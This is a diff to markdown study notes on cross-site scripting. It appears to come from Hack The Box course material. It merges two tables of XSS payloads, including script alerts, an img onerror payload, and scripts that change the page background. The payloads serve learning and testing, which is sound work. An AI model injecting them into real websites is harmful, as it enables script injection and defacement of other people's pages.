@@ -9,18 +9,13 @@ There are three main types of XSS vulnerabilities:
 | Reflected (Non-Persistent) XSS | Occurs when input is processed and shown without storage (e.g., search).   |
 | DOM-based XSS       | Occurs when input is client-side processed and displayed (e.g., parameters).|
 
-## Basic Stored XSS Payloads
+## XSS Payloads
 
 | Code | Description |
 |------|-------------|
 | `<script>alert(window.origin)</script>` | windows.origin shows the URL of the stored XSS if IFrames being used |
 | `<plaintext>` | Stops the rendoring of any HTML code that comes after |
 | `<script>print()</script>` | Pop up the browser print dialog |
-
-
-
-| Code | Description |
-|------|-------------|
 | `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
 | `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
 | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
